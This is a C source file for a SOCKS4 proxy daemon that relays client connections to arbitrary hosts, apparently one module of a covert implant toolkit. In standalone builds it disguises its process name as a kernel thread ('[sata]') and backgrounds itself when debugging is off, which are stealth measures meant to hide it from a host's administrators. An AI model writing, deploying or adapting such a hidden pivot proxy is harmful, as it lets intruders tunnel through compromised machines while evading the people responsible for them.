#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <stdarg.h>
#include <string.h>
#include <stdio.h>
#include <netdb.h>
#include <netinet/in.h>
#include <signal.h>
#include <errno.h>
#include <arpa/inet.h>
#include <unistd.h>

#ifndef STANDALONE
#include "config.h"
#else
#define PROCNAME "[sata]"
#define DEBUG 1
#endif
#include "common.h"

#define VN 0x04
#define CONNECT 0x01
#define BIND	0x02

struct message {
	unsigned char vn;
	unsigned char cd;
	unsigned short dstport;
	unsigned int dstip;
};

#ifdef STANDALONE 

void rename_proc(int argc, char **argv) {
    int i;
    for (i = 0; i < argc; i++) {
        memset(argv[i], 0, strlen(argv[i]));
//        realloc(argv[i], strlen(PROCNAME)+1);
        memcpy(argv[i], PROCNAME, sizeof(PROCNAME));
    }
}
#endif

void print_message(struct message *m) {
#if DEBUG
    struct in_addr in;
    in.s_addr = m->dstip;
	debug("SOCKSv%d ", m->vn);
    if (m->cd == 1) {
	    debug("CONNECT to %s:%d\n", inet_ntoa(in), ntohs(m->dstport));
    } else if (m->cd == 2) {
	    debug("BIND %s:%d\n", inet_ntoa(in), ntohs(m->dstport));
    } else {
        debug("INVALID COMMAND %d\n", m->cd);
    }
#endif
}

#ifdef STANDALONE
int launcher_rcon(unsigned long ip, unsigned short port) {
    int sock;
    struct sockaddr_in cli;

    sock = socket(AF_INET, SOCK_STREAM, 6);
    if (sock < 0) exit(-1);

    memset(&cli, 0, sizeof(cli));
    cli.sin_family = AF_INET;
    cli.sin_port = htons(port);
    cli.sin_addr.s_addr = ip;

    if (connect(sock, (struct sockaddr *) &cli, sizeof(cli)) < 0) {
        close(sock);
        debug("Failed to connect to destination port %d\n", port);
        exit(-1);
    }
	//perror("connect");

    return sock;
}
#else
extern int launcher_rcon(unsigned long ip, unsigned short port);
#endif

void socks_forward(int sock1, int sock2) {
	char buf[BUFSIZE];
    while (1) {
        fd_set  fds;
        int count;

        // put the fd to watch
        FD_ZERO(&fds);
        FD_SET(sock1, &fds);
        FD_SET(sock2, &fds);

        if (select(max(sock1, sock2)  + 1, &fds, NULL, NULL, NULL) < 0 ) break;

        /* stdin => shell */
        if (FD_ISSET(sock1, &fds)) {
            count = read(sock1, buf, BUFSIZE);
            if ((count <= 0)) break;
            if (write(sock2, buf, count) <= 0) break;    
            /* shell => stdout */
        } 
	
		if (FD_ISSET(sock2, &fds)) {
            count = read(sock2, buf, BUFSIZE);
            // TODO: enviar char especial per setejar tamany tty, timeout, etc.
            if ((count <= 0)) break;
            else if (write(sock1, buf, count) <= 0) break;
        }
    }
}

void pthread_socks(void *sock) {
    struct message req;
    read((int)sock, &req, sizeof(struct message));
    char buf[4];
    read((int)sock, buf, 4);
    print_message(&req);
    //debug("USERID: %s\n", buf);

    int sock2;
    if ((sock2 = launcher_rcon(req.dstip, ntohs(req.dstport))) > 0) {
        debug("Connected!\n");
        req.cd = 90;
        debug("Enviant resposta\n");
        write((int)sock, &req, sizeof(req));
        socks_forward((int)sock, sock2);
    } else {
        debug("ERROR!\n");
        req.cd = 91;
        debug("Enviant resposta\n");
        write((int)sock, &req, sizeof(req));
    }
    close((int)sock);
    close(sock2);
    exit(0);
}


void socks4a_daemon(int port) {
    int sock, sock_con, one = 1;
    struct sockaddr_in tcp;
    struct sockaddr_in cli;
    unsigned int slen = sizeof(cli);

    if ((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
        debug("Can't allocate tcp socket\n");
        exit(-1);
    }

    memset((char *) &tcp, 0, sizeof(tcp));
    tcp.sin_family = AF_INET;
    tcp.sin_addr.s_addr = htonl(INADDR_ANY);
    tcp.sin_port = htons(port);

    // We want to reuse the source port port (avoiding bind errors)
    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, (char *)&one, sizeof(int)) < 0)
        debug("Error setsockopt: reuseaddr\n");

    if (bind(sock, (struct sockaddr *) &tcp, sizeof(tcp)) < 0) {
        debug("Error: bind\n");
        exit(-1);
    }

    if (listen(sock, 100) < 0) {
        debug("Error: listen\n");
        exit(-1);
    }

    debug("Listening to port %d\n", port);
    while (1) {
        sock_con = accept(sock, (struct sockaddr *) &cli, &slen);
        if (sock_con < 0) {
            debug("Error: accept\n");
            sleep(1);
        } else {
            debug("Received connection!\n");
            if (!fork()) {
                close(sock);
                pthread_socks((void *)sock_con);
            }
            close(sock_con);
        }
    }
}

int main_socksd(int port) {
    signal(SIGCHLD, sig_child);
#if ! DEBUG
    if (fork()) return 0;
#endif
	socks4a_daemon(port);
	return 0;	
}

#ifdef STANDALONE
int main(int argc, char **argv) {
    if (argc != 2) {
        printf("Usage: %s port\n", argv[0]);
        return -1;
    }
    int port = atoi(argv[1]);
    rename_proc(argc, argv);
    main_socksd(port);
    return 0;
}
#endif
